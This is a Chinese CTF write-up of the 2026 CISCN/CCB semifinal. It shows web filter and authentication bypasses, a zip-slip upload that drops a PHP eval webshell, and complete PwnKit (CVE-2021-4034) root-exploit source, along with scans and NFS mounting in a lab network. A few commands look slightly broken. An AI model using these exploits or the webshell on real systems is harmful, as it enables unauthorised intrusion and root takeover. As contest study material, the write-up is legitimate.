+++
date = '2026-03-22T22:30:00+08:00'
lastmod = '2026-03-23T10:40:00+08:00'
draft = false
title = 'CISCN & CCB 半决赛 - 2026 WriteUP'
categories = ['WriteUP', 'CISCN']
tags = ['WriteUP', 'CISCN', '2026']

+++

本次是以**广外幽灵**战队参赛，作为队里唯一的 Web 也是燃尽了，最终广东赛区第 9 名，成绩也算可以了。

<!--more-->

## AWDP

### Web

#### MediaDrive

##### Fix

我们发现在 `preview.php` 中路径校验不严谨，存在路径穿越的漏洞，用户可以构造恶意数据去打路径穿越，实现任意文件读取。

```php
<?php
declare(strict_types=1);
require_once __DIR__ . "/lib/User.php";
require_once __DIR__ . "/lib/Util.php";

$user = null;
if (isset($_COOKIE['user'])) {
    $user = @unserialize($_COOKIE['user']);
}
if (!$user instanceof User) {
    $user = new User("guest");
    setcookie("user", serialize($user), time() + 86400, "/");
}

$f = (string)($_GET['f'] ?? "");
if ($f === "") {
    http_response_code(400);
    echo "Missing parameter: f";
    exit;
}

$rawPath = $user->basePath . $f;

if (preg_match('/flag|\/flag|\.\.|php:|data:|expect:/i', $rawPath)) {
    http_response_code(403);
    echo "Access denied";
    exit;
}

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);
if ($convertedPath === false || $convertedPath === "") {
    http_response_code(500);
    echo "Conversion failed";
    exit;
}

$content = @file_get_contents($convertedPath);
if ($content === false) {
    http_response_code(404);
    echo "Not found";
    exit;
}

$displayRaw = $rawPath;
$displayConv = $convertedPath;
$isText = true;

for ($i=0; $i<min(strlen($content), 512); $i++) {
    $c = ord($content[$i]);
    if ($c === 0) { $isText = false; break; }
}

?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Preview · MediaDrive</title>
  <link rel="stylesheet" href="/assets/style.css"/>
</head>
<body>
  <div class="app">
    <header class="topbar">
      <div class="brand">
        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
        <a class="brand-title link" href="/">MediaDrive</a>
        <span class="badge">Preview</span>
      </div>
      <div class="actions">
        <a class="btn ghost" href="/profile.php">Preferences</a>
      </div>
    </header>

    <main class="content">
      <section class="card">
        <div class="card-head">
          <h2>File Preview</h2>
          <p class="muted">Converted paths are shown for debugging.</p>
        </div>

        <div class="kv">
          <div><span class="k">User</span><span class="v"><?= Util::h($user->name) ?></span></div>
          <div><span class="k">Encoding</span><span class="v mono"><?= Util::h($user->encoding) ?></span></div>
          <div><span class="k">Raw path</span><span class="v mono"><?= Util::h($displayRaw) ?></span></div>
          <div><span class="k">Converted</span><span class="v mono"><?= Util::h($displayConv) ?></span></div>
        </div>

        <div class="row-actions">
          <a class="btn ghost" href="/">Back</a>
          <a class="btn" href="/download.php?f=<?= urlencode($f) ?>">Download</a>
        </div>

        <div class="preview">
          <?php if ($isText): ?>
            <pre><?= Util::h($content) ?></pre>
          <?php else: ?>
            <pre class="mono"><?=
              Util::h(bin2hex(substr($content, 0, 2048)))
            ?></pre>
            <div class="hint">Binary preview (hex, first 2KB)</div>
          <?php endif; ?>
        </div>
      </section>
    </main>

    <footer class="footer">
      <span class="muted">MediaDrive · Internal tool</span>
      <a class="muted" href="/health.php">health</a>
    </footer>
  </div>
</body>
</html>
```

我们只需要在它构造好的最终路径，添加防止路径穿越的函数，即可完成修复。

```php
$convertedPath = realpath(@iconv($user->encoding, "UTF-8//IGNORE", $rawPath));
if ($convertedPath === false || $convertedPath === "") {
    http_response_code(500);
    echo "Conversion failed";
    exit;
}
```

##### Break

我们留意到函数 `iconv`，经过查询手册，我们可以发现这个函数是用来转换字符的编码的，那么我们就可以利用这个编码，来实现对 `preg_match` 检测的绕过，我们首先构造好 UTF-16 编码的字符串。

```php
<?php

$f = "/flag";
$convertedPath = iconv("UTF-8", "UTF-16", $f);
echo urlencode($convertedPath);
```

然后，我们滞空 User 类中的 `basePath` 即可，将路径完全交给 `$f` 变量控制，然后我们将编码值改成 `UTF-16` 即可完成攻击利用。

```php
<?php

class User {
    public string $name = "admin";
    public string $encoding = "UTF-16";
    public string $basePath = "";

    public function __construct(string $name = "admin") {
        $this->name = $name;
    }
}

echo urlencode(serialize(new User()));
```

最终构造数据包用到的东西。

```plaintext
/preview.php?f=%FE%FF%00%2F%00f%00l%00a%00g
Cookie: user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22encoding%22%3Bs%3A6%3A%22UTF-16%22%3Bs%3A8%3A%22basePath%22%3Bs%3A0%3A%22%22%3B%7D
```

#### easy_time

##### Fix（Fail）

这里的 fix 死活不过，我修完它的鉴权，修完它文件上传存在的路径穿越，最终还是漏洞利用成功，我真是懵了，听说要重启服务，但是重启服务我也试过，每次都是服务异常，难道是我重启失败了？ ？ ？

##### Break

这题的漏洞点也非常明显，首先，我们要想办法解决鉴权，我们看到登录逻辑进行了两层的 md5 的编码，属于硬编码鉴权，我们可以用字典在本地写脚本爆破，当然也是因为这个是弱口令才可以这样做，但是真的需要这么麻烦吗？

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if flask.request.method == 'POST':
        username = flask.request.form.get('username', '')
        password = flask.request.form.get('password', '')

        h1 = hashlib.md5(password.encode('utf-8')).hexdigest()
        h2 = hashlib.md5(h1.encode('utf-8')).hexdigest()
        next_url = flask.request.args.get("next") or flask.url_for("dashboard")

        if username == 'admin' and h2 == "7022cd14c42ff272619d6beacdc9ffde":
            resp = flask.make_response(flask.redirect(next_url))
            resp.set_cookie('visited', 'yes', httponly=True, samesite='Lax')
            resp.set_cookie('user', username, httponly=True, samesite='Lax')
            return resp

        return flask.render_template('login.html', error='用户名或密码错误', username=username), 401

    return flask.render_template('login.html', error=None, username='')
```

聪明的大家应该会直接去看它鉴权的逻辑，然后，我真的绷不住了，它鉴权竟然只是简单的检查 Cookie 中 `visited` 的值是不是 yes，还有 Cookie 中 `user` 的值有没有设置，只要满足这两个条件，我们能够登录了。

```python
def is_logged_in() -> bool:
    return flask.request.cookies.get("visited") == "yes" and bool(flask.request.cookies.get("user"))


def login_required(view):
    def wrapped(*args, **kwargs):
        if not is_logged_in():
            next_url = flask.request.full_path if flask.request.query_string else flask.request.path
            return flask.redirect(flask.url_for("login", next=next_url))
        return view(*args, **kwargs)

    wrapped.__name__ = view.__name__
    return wrapped
```

构造 Cookie 的值如下即可。

```plaintext
Cookie: visited=yes;user=admin;
```

之后，我们很容易审计代码，发现这个项目存在 SSRF 漏洞，我们可以控制 `avatar_url` 的参数，从而去访问到内网的 php 服务。

```python
@app.route('/about', methods=['GET', 'POST'])
@login_required
def about():
    user = flask.request.cookies.get('user')

    conn = db()
    current = conn.execute('SELECT * FROM users WHERE username=?', (user,)).fetchone()
    about_text = current['about'] if current else ''
    avatar_local = current['avatar_local'] if current else ''
    avatar_url = current['avatar_url'] if current else ''

    if flask.request.method == 'POST':
        about_text = flask.request.form.get('about', '')
        avatar_url = flask.request.form.get('avatar_url', '')

        upload = flask.request.files.get('avatar_file')
        if upload and upload.filename:
            raw = upload.read()
            upload.seek(0)
            kind = sniff_image_type(raw)
            if kind not in {'png', 'jpeg', 'gif', 'webp'}:
                conn.close()
                return (
                    flask.render_template(
                        'about.html',
                        user=user,
                        about=about_text,
                        avatar_local=avatar_local,
                        avatar_url=avatar_url,
                        remote_info=fetch_remote_avatar_info(avatar_url),
                        error='头像文件必须是图片（png/jpg/gif/webp）',
                    ),
                    400,
                )

            fname = f"{uuid4().hex}.{ 'jpg' if kind == 'jpeg' else kind }"
            path = AVATAR_DIR / fname
            with open(path, 'wb') as f:
                f.write(raw)
            avatar_local = f"uploads/avatars/{fname}"

        conn.execute(
            'UPDATE users SET about=?, avatar_local=?, avatar_url=? WHERE username=?',
            (about_text, avatar_local, avatar_url, user),
        )
        conn.commit()

        current = conn.execute('SELECT * FROM users WHERE username=?', (user,)).fetchone()
        conn.close()

        return flask.render_template(
            'about.html',
            user=user,
            about=current['about'],
            avatar_local=current['avatar_local'],
            avatar_url=current['avatar_url'],
            remote_info=fetch_remote_avatar_info(current['avatar_url']),
            error=None,
        )

    conn.close()
    return flask.render_template(
        'about.html',
        user=user,
        about=about_text,
        avatar_local=avatar_local,
        avatar_url=avatar_url,
        remote_info=fetch_remote_avatar_info(avatar_url),
        error=None,
    )
```

那么我们怎么 RCE 呢？我留意到这里竟然存在文件上传，那么只要文件上传存在路径穿越漏洞，我就能够上传恶意的 php 文件到 php 服务器上，从而 RCE。经过审计，果然在解压上传压缩包的代码逻辑中，存在路径穿越漏洞，从而能够打通整个攻击链路。

```python
def safe_upload(zip_path: Path, dest_dir: Path) -> list[str]:
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            target = os.path.join(dest_dir, info.filename)  
            if info.is_dir():
                os.makedirs(target, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with open(target, 'wb') as f:
                    f.write(z.read(info.filename))

@app.route('/plugin/upload', methods=['GET', 'POST'])
@login_required
def upload_plugin():
    if flask.request.method == 'GET':
        return flask.render_template('plugin_upload.html', error=None, ok=None, files=None)

    file = flask.request.files.get('plugin')
    if not file or not file.filename:
        return flask.render_template('plugin_upload.html', error='请选择一个 zip 文件', ok=None, files=None), 400

    filename = secure_filename(file.filename)
    if not filename.lower().endswith('.zip'):
        return flask.render_template('plugin_upload.html', error='仅支持 .zip 文件', ok=None, files=None), 400

    saved = UPLOAD_DIR / f"{uuid4().hex}-{filename}"
    file.save(saved)

    dest = PLUGIN_DIR / f"{Path(filename).stem}-{uuid4().hex[:8]}"
    dest.mkdir(parents=True, exist_ok=True)

    try:
        print(saved, dest)
        extracted = safe_upload(saved, dest)
    except Exception:
        shutil.rmtree(dest, ignore_errors=True)
        return flask.render_template('plugin_upload.html', error='解压失败：压缩包内容不合法', ok=None, files=None), 400

    return flask.render_template('plugin_upload.html', error=None, ok='上传并解压成功', files=extracted)
```

开始利用，我们先搓个脚本来构造恶意的压缩包。

```python
import zipfile

with zipfile.ZipFile("exp.zip", "w") as zipf:
    zipf.writestr("../../../../../../../var/www/html/shell.php", "<?php eval($_GET[1]);?>")
```

最后，上传压缩包，打 SSRF 即可 RCE。

![](../assets/屏幕截图%202026-03-22%20120829.png)

## ISW

### 第三届长城杯-isw

#### flag 1

使用 fscan 进行扫描，扫描结果如下。

```plaintext
10.11.165.5:22 open
10.11.165.5:8080 open
[*] WebTitle http://10.11.165.5:8080   code:200 len:794    title:hello world
[+] PocScan http://10.11.165.5:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]
```

我们直接使用工具 Shiro_Attack 进行利用，即可 RCE，从而拿到第一个 flag。

```plaintext
flag{1229b352fce50e20a1ca43f1fe763dfb}
```

#### flag 2

我们上传信息收集工具 `linpeas_linux_386` 进行信息收集，发现当前环境可以打 CVE-2021-4034 漏洞进行提权，我们去资料库中搜索相关资料，最终只找到比较简略的分析文章，文中的 exp 修改进行修改才能够利用，我们的 Pwn 手发大力，最后也是成功纯手工修改脚本，成功提权。

我们要先准备好以下三个文件：

`Makefile`

```makefile
CFLAGS =-Wall
TRUE=$(shell which true)

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

.PHONY: clean
clean:
	rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH =./

gconv-modules:
	echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
	mkdir -p GCONV_PATH =.
	cp /usr/bin/true GCONV_PATH =./pppp:.

pwnkit.so: pwnkit.c
	$(CC) $(CFLAGS) --shared -fPIC -o $@ $<
```

`pwnkit.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step) {
	setuid(0); seteuid(0);
	setgid(0); setegid(0);
	char * const args[] = { "/bin/sh", "-pi", NULL };
	char * const environ[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execve(args[0], args, environ);
	exit(0);
}
```

`cve-2021-4034.c`

```c
// main
#include <unistd.h>
int main(int argc, char **argv) {
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		"pwnkit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/bin/bashxxxx",
		"CHARSET=PWNKIT",
		NULL
	};
	return execve("/usr/bin/pkexec", args, environ);
}
```

我们打包传到服务器上面去 `make` 一下就可以了，运行编译出来的程序即可提权成功。

```bash
./cve-2021-4034
```

最终，在 `/root/` 目录下拿到第二个 flag。

#### flag 3

先进行信息收集。

```plaintext
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.11.165.5  netmask 255.255.255.240  broadcast 10.11.165.15
        inet6 fe80::c6a1:86ab:6487:d6d7  prefixlen 64  scopeid 0x20<link>
        ether fa:04:47:f0:c1:00  txqueuelen 1000  (Ethernet)
        RX packets 31918  bytes 16031482 (15.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21079  bytes 13315333 (12.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.45.50  netmask 255.255.255.0  broadcast 192.168.45.255
        inet6 fe80::f817:6aff:fe76:1001  prefixlen 64  scopeid 0x20<link>
        ether fa:17:6a:76:10:01  txqueuelen 1000  (Ethernet)
        RX packets 1233  bytes 56958 (55.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 712 (712.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

使用 fscan 扫描后结果如下，听说在 `77.*` 段还有 Win 等其他机器，我真服了，fscan 真没扫出来啊。

```plaintext
192.168.45.100:88 open
192.168.45.100:53 open
192.168.45.100:22 open
192.168.45.100:139 open
192.168.45.100:135 open
192.168.45.100:111 open
192.168.45.100:464 open
192.168.45.100:445 open
192.168.45.100:389 open
192.168.45.100:636 open
192.168.45.100:2049 open
192.168.45.100:3269 open
192.168.45.100:3268 open
192.168.45.100:12345 open
192.168.45.100:20048 open
192.168.45.100:34483 open
192.168.45.100:49154 open
192.168.45.100:49153 open
192.168.45.100:49152 open
192.168.45.100:57291 open
```

然后，我们看到一个奇特的端口 `2049`，打过春秋云境 Delivery 靶场的应该知道，这是 nfs 服务的端口，我们进行进一步的验证。

```bash
proxychains4 showmount -e 192.168.45.100 2>/dev/null
```

结果如下。

```plaintext
Export list for 192.168.45.100:
/nfsdir *
```

我们挂载上述目录，既可拿到第三个 flag。

```bash
mkdir /hack
mount -t 192.168.45.100:/nfsdir /hack -o nolock
cat /hack/flag
```

#### 后续思路

根据这个 nfs 服务，我们能够拿到 `77` 段机器的源码，还有 `192.168.45.100` 上面 `agent` 和连接管理 `agent` 的 `manager.exe`，后续要通过逆向分析 `manager.exe` 看看传参和交互的逻辑，就可以实现和 `agent` 交互，从而 RCE 拿到 flag。

然后，分析 `77` 段机器的源码，应该还能拿到一个 flag，可惜研究提权耗费了大量时间，最终还是没有时间继续打下去，也是有点遗憾。

### 第三届长城杯-isw1

首先，入口机的服务存在高权限的任意文件读取漏洞，我们读取 `/proc/self/cmdline` 可以发现，它在运行一个 server，这个估计是个 Pwn，但是时间有限，我们最终没有研究出来。

```bash
/root/pico/server 80
```

赛后复盘，学习一下大佬们的骚操作，发现这里其实还存在其他解法，直接将 `/dev/sda` 磁盘文件下载下来，直接开始取证！好家伙，原来今年的取证在这里！能想到这个思路的师傅也是天才！

### 第三届长城杯-isw2

我们在入口机拿到了 `WatchAgent.exe` 和 `WatchAgent.pdb`，应该是要通过逆向分析，并且使用 RPC 交互工具，和服务端进行交互，从而 RCE，控制入口机，遗憾的是，但是我们所有人都没有 RPC 相关的工具，只能遗憾下播。

## 总结

本次比赛尤其是下午的 ISW，我们明显地察觉到考察内容变得更加多元，题目设计变得更加灵活，对选手的要求也更高，ISW 不再是 Web 手独自发挥，而是要和其他方向结合起来，一起协作才能完成挑战。

也是感觉到比赛的强度越来越高了，希望明年能打出更多的 flag。